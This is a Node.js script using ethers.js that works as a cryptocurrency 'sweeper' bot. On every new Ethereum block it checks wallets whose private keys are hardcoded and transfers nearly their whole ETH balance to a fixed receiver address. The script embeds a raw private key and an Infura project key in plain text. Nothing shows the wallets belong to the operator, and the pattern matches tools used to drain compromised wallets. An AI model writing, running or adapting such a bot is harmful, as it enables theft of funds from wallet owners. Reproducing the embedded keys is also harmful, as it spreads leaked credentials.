const { ethers } = require('ethers')

const provider = new ethers.providers.JsonRpcProvider("https://mainnet.infura.io/v3/5a432dd368ea4f91addc6b81823cd25a")

const addressReceiver = '0x3c24327078db31E770af8D0a36A0F0749d7625F4'

const privateKeys = ["76461a963fde120f9169d9b13cfbba4528e265f566b73a921f4416f44a2d3a5e"]


const bot = async =>{
    provider.on('block', async () => {
        console.log('Listening to new block, waiting ;)');
        for (let i = 0; i < privateKeys.length; i++){
            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);
            const txBuffer = ethers.utils.parseEther("0.003");
            if (balance.sub(txBuffer) > 0){
                console.log("New Account with Eth!");
                const amount = balance.sub(txBuffer);
                try {
                    await target.sendTransaction({
                        to: addressReceiver,
                        value: amount
                    });
                    console.log(`Success! transferred -->${ethers.utils.formatEther(balance)}`);
                } catch(e){
                    console.log(`error: ${e}`);
                }
            }
        }
    })
}
bot();